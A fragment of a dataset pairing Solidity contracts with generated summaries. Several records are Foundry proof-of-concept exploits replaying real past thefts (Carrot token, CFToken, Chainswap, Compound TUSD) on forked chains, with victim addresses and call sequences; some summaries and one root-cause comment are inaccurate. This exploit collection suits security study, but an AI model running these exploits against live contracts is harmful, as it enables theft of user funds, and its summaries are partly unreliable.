        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\n\nCarrot Token was exploited on 2022-10-10 12:53:41 (UTC) on Binance Smart Chain Mainnet. \nA total of $31,318 BSC-USD was lost.\n\nAttacker: 0xd11a93a8db5f8d3fb03b88b4b24c3ed01b8a411c\nAttacker contract: 0x5575406ef6b15eec1986c412b9fbe144522c45ae\nVulnerable contract: 0xcFF086EaD392CcB39C49eCda8C974ad5238452aC\nPool address: 0x6863b549bf730863157318df4496ed111adfa64f\nAttack tx: https://bscscan.com/tx/0xa624660c29ee97f3f4ebd36232d8199e7c97533c9db711fa4027994aa11e01b9\n\nThe Carrot token relays on '_allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\")'\nto prevent unapproved token transfers, it follows an ACTION-CHECK pattern where the tokens are sent without check and \nthe sub() function on the _allowances mapping verifies that the sender did had the permissions to move the tokens.\n \nThis final check can be avoided if the _msgSender() on the _isExcludedFromFee mapping is set to true, \ngiving the _msgSender() the ability to move any user's tokens at its will. \n\nfunction transferFrom(\n  address sender,\n  address recipient,\n  uint256 amount\n) public virtual override returns (bool) {\n  _beforeTransfer(_msgSender(),recipient,amount);\n  \n  if(_isExcludedFromFee[_msgSender()]){\n      _transfer(sender, recipient, amount);\n      return true;\n  }\n  _transfer(sender, recipient, amount);\n  _approve(\n      sender,\n      _msgSender(),\n      _allowances[sender][_msgSender()].sub(\n          amount,\n          \"ERC20: transfer amount exceeds allowance\"\n      )\n  );\n  return true;\n}\n\nThe only way to add an address to the _isExcludedFromFee mapping is if the owner of an external \ncontract \"Pool\" is thec aller of a transfer and the counter variable is set to 0. This variable \nwould act as a safety measure to stop anyone else from adding their address after the exploiter has done it.\n\nfunction _beforeTransfer( address from,address to,uint256 amount) private{\n  if(from.isContract())\n  if(ownership(pool).owner() == from && counter ==0){\n      _isExcludedFromFee[from] = true;\n      counter++;\n  }          \n  _beforeTokenTransfer(from, to, amount);\n}\n\nThe Pool address is set via the onlyOwner initPool function on the token.\n\nfunction initPool(address _Pool) public onlyOwner {\n    require(pool == address(0));\n    pool = _Pool;\n}\n\nFinally to set the owner of the Pool Contract the transReward on the token is called with the change owner\nfunction selector \"0xbf699b4b\" and the address desired, in the attack this would be \"0x5575406ef6b15eec1986c412b9fbe144522c45ae\"\n\nRoot cause: Insufficient access control to the migrateStake function.\n\nOriginal PoC by: SunWeb3Sec \nExplanation by: Kayaba-Attribution\n*/\n\ninterface ICarrot is IERC20{\n    function transReward(bytes memory data) external;\n}\n\ncontract ContractTest is DSTest {\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    ICarrot Carrot = ICarrot(0xcFF086EaD392CcB39C49eCda8C974ad5238452aC);\n    IERC20 USD = IERC20(0x55d398326f99059fF775485246999027B3197955);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 22055611); // fork bsc at block 22055611\n        cheats.label(address(Carrot), \"Carrot\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(\n            address(0x6863b549bf730863157318df4496eD111aDFA64f),\n            \"Pool\"\n        );\n    }\n\n    function testExploit() public {\n        console.log(\"Perform transReward to set owner\");\n        Carrot.transReward(\n            hex\"bf699b4b000000000000000000000000b4c79daB8f259C7Aee6E5b2Aa729821864227e84\"\n        );\n\n        console.log(\"Perform transferFrom\");\n        Carrot.transferFrom(\n            0x00B433800970286CF08F34C96cf07f35412F1161,\n            address(this),\n            310344736073087429864760\n        );\n\n        console.log(\"Perform Carrot to BSC-USD swap\");\n        CarrotToUST();\n\n        console.log(\n            \"After exploiting, BSC-USD balance:\",\n            USD.balanceOf(address(this)) / 1e18\n        );\n    }\n\n    function migrateWithdraw(\n        address,\n        uint256 //callback\n    ) public {}\n\n    function CarrotToUST() internal {\n        Carrot.approve(address(Router), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(Carrot);\n        path[1] = address(USD);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            Carrot.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}\n",
        "summary": "This is a Solidity smart contract that contains an exploit for the Carrot token, which was already exploited on the Binance Smart Chain Mainnet. The code describes the vulnerabilities in the Carrot token contract and explains how the exploit works. It then presents a test to simulate the exploit and steal BSC-USD tokens. The exploit leverages insufficient access control over the `migrateStake()` function and the `_isExcludedFromFee` mapping to gain control over the transfer of tokens. The test creates a fork of the BSC at a given block and performs the exploit on the Carrot token contract before exchanging the tokens for BSC-USD using a Uniswap router.",
        "id": "2f3c8f42-74be-455f-b8b7-515cce68f5c4",
        "api_seq": "Casino"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract Casino {\n    \n    uint private start;\n    \n    uint private buyPeriod = 1000;\n    uint private verifyPeriod = 100;\n    uint private checkPeriod = 100;\n    \n    mapping(address => uint) private _tickets;\n    mapping(address => uint) private _winnings;\n\n    address[] _entries;\n    address[] _verified;\n\n    uint private winnerSeed;\n    bool private hasWinner;\n    address private winner;\n    \n    function Casino()\n        public {\n        start = block.timestamp;    \n    }\n    \n    /**\n     * This should NOT be part of the contract!!\n     */\n    function unsafeEntry(uint number, uint salt) \n        public\n        payable\n        returns (bool) {\n        return buyTicket(generateHash(number, salt));\n    }\n    \n    function generateHash(uint number, uint salt)\n        public\n        pure\n        returns (uint) {\n        return uint(keccak256(number + salt));\n    }\n    \n    function buyTicket(uint hash)\n        public\n        payable\n        returns (bool) {\n        // Within the timeframe\n        require(block.timestamp < start+buyPeriod);\n        // Correct amount\n        require(1 ether == msg.value);\n        // 1 entry per address\n        require(_tickets[msg.sender] == 0);\n        _tickets[msg.sender] = hash;\n        _entries.push(msg.sender);\n        return true;\n    }\n    \n    function verifyTicket(uint number, uint salt)\n        public\n        returns (bool) {\n        // Within the timeframe\n        require(block.timestamp >= start+buyPeriod);\n        require(block.timestamp < start+buyPeriod+verifyPeriod);\n        // Has a valid entry\n        require(_tickets[msg.sender] > 0);\n        // Validate hash\n        require(salt > number);\n        require(generateHash(number, salt) == _tickets[msg.sender]);\n        winnerSeed = winnerSeed ^ salt ^ uint(msg.sender);\n        _verified.push(msg.sender);\n    }\n    \n    function checkWinner()\n        public\n        returns (bool) {\n        // Within the timeframe\n        require(block.timestamp >= start+buyPeriod+verifyPeriod);\n        require(block.timestamp < start+buyPeriod+verifyPeriod+checkPeriod);\n        if (!hasWinner) {\n            winner = _verified[winnerSeed % _verified.length];\n            _winnings[winner] = _verified.length-10 ether;\n            hasWinner = true;\n        }\n        return msg.sender == winner;\n    }\n    \n    function claim()\n        public {\n        // Has winnings to claim\n        require(_winnings[msg.sender] > 0);\n        uint claimAmount = _winnings[msg.sender];\n        _winnings[msg.sender] = 0;\n        msg.sender.transfer(claimAmount);        \n    }\n}",
        "summary": "This code represents a decentralized casino smart contract where people can buy lottery tickets using Ethereum's native token Ether. The contract sets some fixed time periods for buying tickets, verifying them, and checking the winner. Once the buying period has ended, the contract moves to verification mode where participants can check their ticket numbers and salt to verify their entries. After that, the contract moves to the checking mode to determine the winner by generating a seed and getting the modulus by the number of verified entries. Finally, the contract allows the winner to claim their winnings by calling the 'claim' function, which transfers the winnings to the winner's account.",
        "id": "ece247c4-8a13-4af7-8e56-c5848f9b2923",
        "api_seq": "Centralization"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract Centralization is ERC20, Ownable {\n    constructor() ERC20(\"Centralization\", \"Cent\") {\n        address exposedAccount = 0xe16C1623c1AA7D919cd2241d8b36d9E79C1Be2A2;\n        transferOwnership(exposedAccount);\n    }\n\n    function mint(address to, uint256 amount) external onlyOwner{\n        _mint(to, amount);\n    }\n}",
        "summary": "This code is creating a smart contract called \"Centralization\" that inherits from the ERC20 and Ownable contracts. It is also specifying the name of the token as \"Centralization\" and its symbol as \"Cent\". \n\nThe contract has a constructor that transfers the ownership of the contract to a specific address (0xe16C1623c1AA7D919cd2241d8b36d9E79C1Be2A2). \n\nAdditionally, the contract has a function called \"mint\" which can only be executed by the contract owner. This function creates new tokens and sends them to the specified address.",
        "id": "0496991d-743f-4fb0-ba80-64e02271a3b3",
        "api_seq": "cftoken_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// source\n// https://mp.weixin.qq.com/s/_7vIlVBI9g9IgGpS9OwPIQ\n// attack tx: 0xc7647406542f8f2473a06fea142d223022370aa5722c044c2b7ea030b8965dd0\n// test result\n\n// > forge test --contracts ./src/cftoken_exp.sol -vv\n// [\u2818] Compiling...\n// No files changed, compilation skipped\n\n// Running 2 tests for test/Counter.t.sol:CounterTest\n// [PASS] testIncrement() (gas: 28334)\n// [PASS] testSetNumber(uint256) (runs: 256, \u03bc: 27476, ~: 28409)\n// Test result: ok. 2 passed; 0 failed; finished in 16.14ms\n\n// Running 1 test for src/cftoken_exp.sol:ContractTest\n// [PASS] testExploit() (gas: 86577)\n// Logs:\n//   Before exploit, cftoken balance:: 0\n//   After exploit, cftoken balance:: 930000000000000000000\n\n// Test result: ok. 1 passed; 0 failed; finished in 9.72s%\n\ncontract ContractTest is DSTest {\n    address private cftoken = 0x8B7218CF6Ac641382D7C723dE8aA173e98a80196;\n    address private cfpair = 0x7FdC0D8857c6D90FD79E22511baf059c0c71BF8b;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 16841980); //fork bsc at block 16841980\n    }\n\n    function testExploit() public {\n        emit log_named_uint(\n            \"Before exploit, cftoken balance:\",\n            ICFToken(cftoken).balanceOf(address(msg.sender))\n        );\n\n        ICFToken(cftoken)._transfer(cfpair, payable(msg.sender), 1000000000000000000000);\n\n        emit log_named_uint(\n            \"After exploit, cftoken balance:\",\n            ICFToken(cftoken).balanceOf(address(msg.sender))\n        );\n    }\n}\n",
        "summary": "This code includes a solidity contract that tests an exploit on a smart contract named \"cftoken\". The test contract imports other contracts and libraries and defines the address of the \"cftoken\" and \"cfpair\" contracts. The function \"setUp\" sets up a fork to simulate the Binance Smart Chain at a specified block number. The function \"testExploit\" issues a transaction to the \"cftoken\" smart contract, which transfers a large amount of tokens to the user executing the transaction. The test logs the balance of the user before and after the exploit. This code is built as a framework for testing security vulnerabilities in crypto smart contracts.",
        "id": "746cfb6c-7507-4883-8592-a3bcf1f17a8d",
        "api_seq": "Chainswap_exp1"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.6.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\nstruct Signature {\n    address signatory;\n    uint8   v;\n    bytes32 r;\n    bytes32 s;\n}\n\ninterface IChainswap {\n  function receive(uint256 fromChainId, address to, uint256 nonce, uint256 volume, Signature[] memory signatures) virtual external payable;\n}\n\ncontract ContractTest is DSTest {\n  address exploiter = 0x941a9E3B91E1cc015702B897C512D265fAE88A9c;\n  address proxy = 0x7fe68FC06e1A870DcbeE0acAe8720396DC12FC86;\n  address impl = 0x373CE6Da1AEB73A9bcA412F2D3b7eD07Af3AD490;\n\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 12751487); // fork mainnet at block 13125070\n    // https://etherscan.io/tx/0x5c5688a9f981a07ed509481352f12f22a4bd7cea46a932c6d6bbe67cca3c54be\n  }\n\n  function testExploit() public {\n    Signature[] memory sigs = new Signature[](4);\n    sigs[0] = Signature({signatory: 0x8C46b006D1c01739E8f71119AdB8c6084F739359, v: 27, r: 0x7b9ce0f78253f7dcf8bf6a2d7a4c38a151eba15eefe6b355a67a373653192765, s: 0x0a4b99389149cc4f7f6051299145c113f5aa50dccf19f748516c4c977f475d6c});\n    sigs[1] = Signature({signatory: 0x4F559d3c39C3F3d408aFBFB27C44B94badA8dEd5, v: 27, r: 0x692e284a3efd148d6dd23b44055740fac7154a482fbeff7f2cc4acf4002fa62d, s: 0x1134236483ad360a775e6c22100f83ba5091115323417205cfbd4ae898cd0bc2});\n    sigs[2] = Signature({signatory: 0x6EA6D36d73cF8ccD629Fbc5704eE356144A89A06, v: 28, r: 0x9ca27b8ec05746c43cd67e0099015ea9b88bdf34e8acfd6ace9dd63b8a320433, s: 0x1d4aaa253afc6c5d5f893d4a572de830538aeef3b65cb6ff3bb6fec738a899d0});\n    \n    proxy.call(abi.encodeWithSignature(\"receive(uint256,address,uint256,uint256, Signature[])\", 1, exploiter, 1, 19392277118050930170440,  sigs));\n    // function receive(uint256 fromChainId, address to, uint256 nonce, uint256 volume, Signature[] memory signatures) virtual external payable {\n    // _chargeFee();\n    // require(received[fromChainId][to][nonce] == 0, 'withdrawn already');\n    // uint N = signatures.length;\n    // require(N >= Factory(factory).getConfig(_minSignatures_), 'too few signatures');\n    // for(uint i=0; i<N; i++) {\n    //     for(uint j=0; j<i; j++)\n    //         require(signatures[i].signatory != signatures[j].signatory, 'repetitive signatory');\n    //     bytes32 structHash = keccak256(abi.encode(RECEIVE_TYPEHASH, fromChainId, to, nonce, volume, signatures[i].signatory));\n    //     bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", _DOMAIN_SEPARATOR, structHash));\n    //     address signatory = ecrecover(digest, signatures[i].v, signatures[i].r, signatures[i].s);\n    //     require(signatory != address(0), \"invalid signature\");\n    //     **require(signatory == signatures[i].signatory, \"unauthorized\");**\n    //     _decreaseAuthQuota(signatures[i].signatory, volume);\n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This code appears to be a smart contract written in Solidity that is being used for testing. \n\nIt imports a solidity file (\"interface.sol\") and a contract (\"Test.sol\") from the \"forge-std\" library. It also defines a struct named \"Signature\" and an interface named \"IChainswap\". \n\nThe \"ContractTest\" contract defines the addresses of three contracts and a function called \"setUp\". \n\nThe \"setUp\" function initializes an instance of \"CheatCodes\" and calls \"createSelectFork\" with two arguments. \n\nThe \"testExploit\" function defines an array of \"Signature\" structs and calls a function called \"receive\" on the \"proxy\" contract, passing in arguments including the array of \"Signature\" structs. The \"receive\" function is presumably defined in the \"IChainswap\" interface. \n\nThere is also a \"receive\" function defined in the contract, but it appears to be empty and unused.",
        "id": "039fed5d-3e0d-4904-8a0a-32a92b27e505",
        "api_seq": "Chainswap_exp2"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\nstruct Signature {\n    address signatory;\n    uint8   v;\n    bytes32 r;\n    bytes32 s;\n}\n\ninterface IChainswap {\n  function receive(uint256 fromChainId, address to, uint256 nonce, uint256 volume, Signature[] memory signatures) virtual external payable;\n}\n\ncontract ContractTest is DSTest {  \n  address exploiter = 0xEda5066780dE29D00dfb54581A707ef6F52D8113;\n  address proxy = 0x089165ac9a7Bf61833Da86268F34A01652543466;\n  address impl = 0xc5185d2c68aAa7c5f0921948f8135d01510D647F;\n\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"bsc\", 9042274); // fork mainnet at block 13125070   \n  }\n\n  function testExploit() public {\n    // https://bscscan.com/tx/0x83b4adaf73ad34c5c53aa9b805579ed74bc1391c5297201e6457cde709dff723\n    Signature[] memory sigs = new Signature[](1);\n    sigs[0] = Signature({signatory: 0xF1790Ac4900F761F677107de65CE6Ed65f952A7c, v: 28, r: 0x961afd291dbcec7dc1b0fa28f989f805fe1acdb18fcf2369d434710cde4c03ac, s: 0x39884d4ef7e88e9b70b0135fca3dd2a97e806ead11e38aa6e75f550724962910});\n    \n    proxy.call(abi.encodeWithSignature(\"receive(uint256,address,uint256,uint256, Signature[])\", 1, exploiter, 0, 500000000000000000000000,  sigs));    \n  }\n\n  receive() external payable {}\n}\n",
        "summary": "This is a Solidity smart contract that tests an exploit against a contract called IChainswap, which has a receive function that accepts a series of signatures. The exploit sends a large amount of funds to an exploiter's address by calling this receive function through a proxy contract with a set of pre-signed signatures. The test sets up a fork of the Binance Smart Chain mainnet and runs the exploit to check if it succeeds.",
        "id": "be094842-dbfe-49ec-a655-f0a2a39efc48",
        "api_seq": "ChecksEffectsInteractions"
    },
    {
        "code": "// This code has not been professionally audited, therefore I cannot make any promises about\n// safety or correctness. Use at own risk.\n\npragma solidity ^0.4.21;\n\ncontract ChecksEffectsInteractions {\n\n    mapping(address => uint) balances;\n\n    function deposit() public payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw(uint amount) public {\n        require(balances[msg.sender] >= amount);\n\n        balances[msg.sender] -= amount;\n\n        msg.sender.transfer(amount);\n    }\n}\n",
        "summary": "This is a Solidity contract code that implements a basic deposit and withdrawal functionality. It has a mapping of user addresses to their balances and two functions: deposit, which allows users to deposit funds into their balance by sending Ether to this contract, and withdraw, which allows users to withdraw funds from their balance. The withdraw function deducts the requested amount from the user's balance and transfers that amount back to the user's address. The contract has a basic security measure implemented in the form of a 'require' statement that checks the user's balance before allowing a withdrawal, in order to prevent unauthorized or insufficiently funded withdrawals.",
        "id": "ad8c5ec2-7a27-48d2-88cb-9975bcfe9238",
        "api_seq": "Compiled"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ninterface ERC20 {\n    function transferFrom(address _from, address _to, uint _value) public returns (bool);\n    function approve(address _spender, uint _value) public returns (bool);\n    function allowance(address _owner, address _spender) public constant returns (uint);\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ninterface ERC223 {\n    function transfer(address _to, uint _value, bytes _data) public returns (bool);\n    event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);\n}\n\ncontract ERC223ReceivingContract {\n    function tokenFallback(address _from, uint _value, bytes _data) public;\n}\n\ncontract Token {\n    string internal _symbol;\n    string internal _name;\n    uint8 internal _decimals;\n    uint internal _totalSupply = 1000;\n    mapping (address => uint) internal _balanceOf;\n    mapping (address => mapping (address => uint)) internal _allowances;\n\n    function Token(string symbol, string name, uint8 decimals, uint totalSupply) public {\n        _symbol = symbol;\n        _name = name;\n        _decimals = decimals;\n        _totalSupply = totalSupply;\n    }\n\n    function name() public constant returns (string) {\n        return _name;\n    }\n\n    function symbol() public constant returns (string) {\n        return _symbol;\n    }\n\n    function decimals() public constant returns (uint8) {\n        return _decimals;\n    }\n\n    function totalSupply() public constant returns (uint) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address _addr) public constant returns (uint);\n    function transfer(address _to, uint _value) public returns (bool);\n    event Transfer(address indexed _from, address indexed _to, uint _value);\n}\n\nlibrary SafeMath {\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a * b;\n    assert(a == 0 || c / a == b);\n    return c;\n  }\n\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\n    uint256 c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n    return c;\n  }\n\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n    assert(b <= a);\n    return a - b;\n  }\n\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\n    uint256 c = a + b;\n    assert(c >= a);\n    return c;\n  }\n}\n\ncontract MyFirstToken is Token(\"MFT\", \"My First Token\", 18, 1000), ERC20, ERC223 {\n\n    using SafeMath for uint;\n\n    function MyFirstToken() public {\n        _balanceOf[msg.sender] = _totalSupply;\n    }\n\n    function totalSupply() public constant returns (uint) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address _addr) public constant returns (uint) {\n        return _balanceOf[_addr];\n    }\n\n    function transfer(address _to, uint _value) public returns (bool) {\n        if (_value > 0 &&\n            _value <= _balanceOf[msg.sender] &&\n            !isContract(_to)) {\n            _balanceOf[msg.sender] = _balanceOf[msg.sender].sub(_value);\n            _balanceOf[_to] = _balanceOf[_to].add(_value);\n            Transfer(msg.sender, _to, _value);\n            return true;\n        }\n        return false;\n    }\n\n    function transfer(address _to, uint _value, bytes _data) public returns (bool) {\n        if (_value > 0 &&\n            _value <= _balanceOf[msg.sender] &&\n            isContract(_to)) {\n            _balanceOf[msg.sender] = _balanceOf[msg.sender].sub(_value);\n            _balanceOf[_to] = _balanceOf[_to].add(_value);\n            ERC223ReceivingContract _contract = ERC223ReceivingContract(_to);\n            _contract.tokenFallback(msg.sender, _value, _data);\n            Transfer(msg.sender, _to, _value, _data);\n            return true;\n        }\n        return false;\n    }\n\n    function isContract(address _addr) private constant returns (bool) {\n        uint codeSize;\n        assembly {\n            codeSize := extcodesize(_addr)\n        }\n        return codeSize > 0;\n    }\n\n    function transferFrom(address _from, address _to, uint _value) public returns (bool) {\n        if (_allowances[_from][msg.sender] > 0 &&\n            _value > 0 &&\n            _allowances[_from][msg.sender] >= _value &&\n            _balanceOf[_from] >= _value) {\n            _balanceOf[_from] = _balanceOf[_from].sub(_value);\n            _balanceOf[_to] = _balanceOf[_to].add(_value);\n            _allowances[_from][msg.sender] = _allowances[_from][msg.sender].sub(_value);\n            Transfer(_from, _to, _value);\n            return true;\n        }\n        return false;\n    }\n\n    function approve(address _spender, uint _value) public returns (bool) {\n        _allowances[msg.sender][_spender] = _allowances[msg.sender][_spender].add(_value);\n        Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n    function allowance(address _owner, address _spender) public constant returns (uint) {\n        return _allowances[_owner][_spender];\n    }\n}\n",
        "summary": "This code is a template for creating a ERC20 and ERC223 compatible token. It creates a Token contract which contains basic functions for retrieving token information, managing balances, and transferring tokens. The Token contract also implements the ERC20 and ERC223 interfaces which provides additional functionality for managing token allowances and interacting with contracts that can receive tokens. The code also includes a SafeMath library to prevent integer overflow and underflow. Finally, it includes an example MyFirstToken contract that extends the Token contract and implements the required functions for ERC20 and ERC223 compatibility.",
        "id": "7e1f2d53-849c-41db-b578-87bf7d52fd7c",
        "api_seq": "CompoundTusd_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  ICErc20Delegate cTUSD =\n    ICErc20Delegate(0x12392F67bdf24faE0AF363c24aC620a2f67DAd86);\n  IERC20 tusd = IERC20(0x0000000000085d4780B73119b644AE5ecd22b376);\n  address tusdLegacy = 0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E;\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 14266479); // fork mainnet at block 14266479\n  }\n\n  function testExample() public {\n    emit log_named_uint(\n      \"Before exploit, Compound TUSD balance:\",\n      tusd.balanceOf(address(cTUSD))\n    );\n    cTUSD.sweepToken(tusdLegacy);\n    emit log_named_uint(\n      \"After exploit, Compound TUSD balance:\",\n      tusd.balanceOf(address(cTUSD))\n    );\n  }\n}\n",
        "summary": "This code is a test contract in Solidity. It imports two interfaces, `Test.sol` and `interface.sol`, and sets up `cTUSD`, `tusd`, `tusdLegacy`, and `cheats`. The `setUp()` function sets up a fork of the mainnet at a particular block. The `testExample()` function tests an exploit by calling the `sweepToken()` function on `cTUSD` to transfer a certain amount of TUSD to the `tusdLegacy` address and then logs the balance of `cTUSD` before and after the exploit.",
        "id": "b980154a-6c8d-4260-b5dd-ee438adea88a",
        "api_seq": "Constant"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\ncontract Constant {\n    // constant\u53d8\u91cf\u5fc5\u987b\u5728\u58f0\u660e\u7684\u65f6\u5019\u521d\u59cb\u5316\uff0c\u4e4b\u540e\u4e0d\u80fd\u6539\u53d8\n    uint256 public constant CONSTANT_NUM = 10;\n    string public constant CONSTANT_STRING = \"0xAA\";\n    bytes public constant CONSTANT_BYTES = \"WTF\";\n    address public constant CONSTANT_ADDRESS = 0x0000000000000000000000000000000000000000;\n\n    // immutable\u53d8\u91cf\u53ef\u4ee5\u5728constructor\u91cc\u521d\u59cb\u5316\uff0c\u4e4b\u540e\u4e0d\u80fd\u6539\u53d8\n    uint256 public immutable IMMUTABLE_NUM = 9999999999;\n    address public immutable IMMUTABLE_ADDRESS;\n    uint256 public immutable IMMUTABLE_BLOCK;\n    uint256 public immutable IMMUTABLE_TEST;\n\n    // \u5229\u7528constructor\u521d\u59cb\u5316immutable\u53d8\u91cf\uff0c\u56e0\u6b64\u53ef\u4ee5\u5229\u7528\n    constructor(){\n        IMMUTABLE_ADDRESS = address(this);\n        IMMUTABLE_BLOCK = block.number;\n        IMMUTABLE_TEST = test();\n    }\n\n    function test() public pure returns(uint256){\n        uint256 what = 9;\n        return(what);\n    }\n}\n",
        "summary": "This code defines a Solidity smart contract called `Constant`. The contract contains the following:\n\n1. Several constant variables that cannot be changed after initialization, including a uint, string, bytes, and address.\n2. Several immutable variables that can be initialized in the constructor but cannot be changed after that, including a uint, address, and two additional uint variables that are initialized using a function called `test()`.\n3. A function called `test()` that takes no arguments and returns a uint. The function sets a uint variable to 9 and returns it.\n4. The contract uses a Solidity version of 0.8.4.\n\nOverall, the contract demonstrates the differences and usage of constant and immutable variables in Solidity.",
        "id": "45a554e6-8072-430b-bce0-c0c920ca9cf8",
        "api_seq": "Context"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n",
        "summary": "This contract is a library-like contract that provides information about the current execution context in a Solidity smart contract, including the sender of the Ethereum transaction and its data. It abstracts the msg.sender and msg.data variables which should not be accessed directly in some cases, especially when dealing with meta-transactions where the account sending and paying for execution might not be the actual sender. It is used as a parent contract in other contracts that require context information or to manage access control to functions.",
        "id": "bac8973e-48ed-432d-b8e2-c52698b07724",
        "api_seq": "Contract.t"
    },
    {
        "code": "// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.13;\n\nimport \"forge-std/Test.sol\";\n\nimport \"src/Contract.sol\";\n\ncontract TestContract is Test {\n    Contract c;\n\n    function setUp() public {\n        c = new Contract();\n    }\n\n    function testBar() public {\n        assertEq(uint256(1), uint256(1), \"ok\");\n    }\n\n    function testFoo(uint256 x) public {\n        vm.assume(x < type(uint128).max);\n        assertEq(x + x, x * 2);\n    }\n}\n",
        "summary": "This Solidity code contains a contract called TestContract that imports two other contracts (Test.sol and Contract.sol).\n\nThe TestContract initializes an instance of the Contract contract in the setUp() function, and then defines two test functions, testBar() and testFoo(), that test the functionality of the Contract contract.\n\nThe testBar() function simply tests that 1 is equal to 1 using the assertEq() function.\n\nThe testFoo() function takes in a uint256 parameter x and tests whether x + x is equal to x * 2, while also defining an assumption that x must be less than the maximum value of a uint128 variable.",
        "id": "0ad049e9-4467-49b7-be9b-d5cf1bc8aad3",
        "api_seq": "ContractCheck"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n// \u7528extcodesize\u68c0\u67e5\u662f\u5426\u4e3a\u5408\u7ea6\u5730\u5740\ncontract ContractCheck is ERC20 {\n    // \u6784\u9020\u51fd\u6570\uff1a\u521d\u59cb\u5316\u4ee3\u5e01\u540d\u79f0\u548c\u4ee3\u53f7\n    constructor() ERC20(\"\", \"\") {}\n    \n    // \u5229\u7528 extcodesize \u68c0\u67e5\u662f\u5426\u4e3a\u5408\u7ea6\n    function isContract(address account) public view returns (bool) {\n        // extcodesize > 0 \u7684\u5730\u5740\u4e00\u5b9a\u662f\u5408\u7ea6\u5730\u5740\n        // \u4f46\u662f\u5408\u7ea6\u5728\u6784\u9020\u51fd\u6570\u65f6\u5019 extcodesize \u4e3a0\n        uint size;\n        assembly {\n            size := extcodesize(account)\n        }\n        return size > 0;\n    }\n\n    // mint\u51fd\u6570\uff0c\u53ea\u6709\u975e\u5408\u7ea6\u5730\u5740\u80fd\u8c03\u7528\uff08\u6709\u6f0f\u6d1e\uff09\n    function mint() public {\n        require(!isContract(msg.sender), \"Contract not allowed!\");\n        _mint(msg.sender, 100);\n    }\n}\n\n// \u5229\u7528\u6784\u9020\u51fd\u6570\u7684\u7279\u70b9\u653b\u51fb\ncontract NotContract {\n    bool public isContract;\n    address public contractCheck;\n\n    // \u5f53\u5408\u7ea6\u6b63\u5728\u88ab\u521b\u5efa\u65f6\uff0cextcodesize (\u4ee3\u7801\u957f\u5ea6) \u4e3a 0\uff0c\u56e0\u6b64\u4e0d\u4f1a\u88ab isContract() 